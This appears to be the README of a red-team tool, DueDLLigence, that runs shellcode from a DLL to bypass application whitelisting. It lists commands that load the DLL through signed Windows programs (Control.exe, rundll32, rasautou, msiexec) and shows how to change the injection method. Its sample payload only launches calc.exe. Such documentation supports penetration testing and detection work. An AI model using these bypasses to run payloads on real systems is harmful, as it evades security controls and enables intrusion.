# DueDLLigence

Shellcode runner for all application whitelisting bypasses. The shellcode included in this project spawns calc.exe.


If desired, change the injection type by modifying the following line to the appropriate injection type
<br>```public const ExecutionMethod method = ExecutionMethod.CreateThread;```

Running the DLL with the following legitimate exes 

## Control.exe
Export: CPlApplet
Syntax: Rename compiled “dll” extension to “cpl” and just double click it!
<br>```Control.exe [cplfile]```
<br>```Rundll32.exe Shell32.dll, Control_RunDLL [cplfile]```

## Rasautou
Export: powershell
<br>```rasautou –d {dllpayload} –p powershell –a a –e e```

## Msiexec
Export: DllUnregisterServer
<br>```msiexec /z {full path to msiexec.dll}```
